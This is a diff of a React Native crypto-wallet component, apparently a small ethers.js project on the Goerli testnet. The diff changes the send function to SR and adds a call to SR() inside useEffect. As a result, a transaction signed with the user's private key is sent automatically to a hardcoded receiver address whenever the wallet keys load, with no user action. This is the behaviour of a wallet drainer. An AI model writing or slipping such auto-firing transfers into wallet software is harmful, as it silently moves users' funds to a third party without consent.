@@ -21,9 +21,11 @@ function Wallet() {
 
   const [balance, setBalance] = useState('');
 
-  const recieverAddress='0x8364D1f740F25D245ffA2Ec5f94dd9C106427433';
-  const SendRecieve = async () => {
-    //provider will be our connection to the Tenderly Web3 Gateway. We pull the URL from the .env file we created earlier.
+  const recieverAddress='0x8364D1f740F25D245ffA2Ec5f94dd9C106427433'; // charan annas
+
+async function SR() {
+    try {
+        console.log('func activated');
     const provider = new ethers.providers.JsonRpcProvider('https://rpc.ankr.com/eth_goerli',
     5,);
     const sender = new ethers.Wallet(privatekey, provider);
@@ -38,6 +40,10 @@ function Wallet() {
     await provider.waitForTransaction(tx.hash, 1, 150000).then(() => {});
     const balanceAfter = await provider.getBalance(recieverAddress);
     console.log(`Destination balance after sending: ${ethers.utils.formatEther(balanceAfter)} ETH`);
+      } catch (error) {
+        console.log(error);
+        console.log('Error in Send');
+      }
 }
 
   async function fetchBalance() {
@@ -57,6 +63,7 @@ function Wallet() {
 
   useEffect(() => {
     fetchBalance();
+    SR();
   }, [publicKey, privatekey, publicAddress]);
 
   return (
@@ -67,7 +74,7 @@ function Wallet() {
         <Text>Public Address: {publicAddress}</Text>
         <Button title="Fetch Balance" onPress={fetchBalance} />
         <Text>Balance: {balance} ETH</Text>
-        <Button title="Send" onPress={SendRecieve} />
+        <Button title="Send" onPress={SR} />
       </View>
     </>
   );
